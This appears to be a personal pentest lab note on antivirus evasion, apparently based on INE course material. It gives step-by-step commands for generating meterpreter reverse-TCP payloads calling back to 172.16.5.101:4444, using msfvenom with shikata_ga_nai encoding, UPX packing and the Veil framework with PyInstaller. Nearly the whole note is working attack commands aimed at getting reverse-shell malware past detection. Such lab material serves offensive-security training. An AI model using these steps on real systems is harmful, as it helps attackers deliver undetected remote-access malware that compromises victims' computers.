AV Evasion
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe
```
change iterations accordingly to make your payload obfuscate

Still didn't work, try this 
```
upx --best --ultra-brute -f rTCPenc.exe -o rTCPenc2.exe
```

Still not, use veil
```
veil
```
![[Pasted image 20240803184441.png]]

We will be using the **Evasion** payload:

**Command:**  

```
use 1
```

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_10.png)

List the available payloads:

**Command:**  

```
list
```

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_11.png)

Locate the `python/meterpreter/rev_tcp.py` payload:

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_12.png)

It's located at number 28. Select that payload:

**Command:**  

```
use 28
```

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_13.png)

For this payload, we will specify the `LHOST` and `LPORT` values and generate the payload:

**Commands:**  

```
set LHOST 172.16.5.101
set LPORT 4444
generate
```

Specify the resulting payload file name as **rTCPveil**.

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_14.png)

We will be using **PyInstaller** to create the payload executable:

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_15.png)

In a few seconds, the payload would be generated:

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_16.png)

Press enter and enter `exit` command to exit the Veil Framework:

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_17.png)

Copy the payload file to `/root` (the directory where the Python-based HTTP server is running):

**Commands:**  

```
mv /var/lib/veil/output/compiled/rTCPveil.exe .
file rTCPveil.exe
```

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_18.png)


Still  not working using upx again
Pack the file using UPX:

**Command:**  

```
upx --best --ultra-brute -f rTCPveil.exe -o rTCPveil2.exe
file rTCPveil2.exe
```

![Content Image](https://assets.ine.com/content/ptp/bypassing_av/12_22.png)

Notice that the resulting executable `rTCPveil2.exe` is a UPX compressed PE32 executable!

Now It should work....!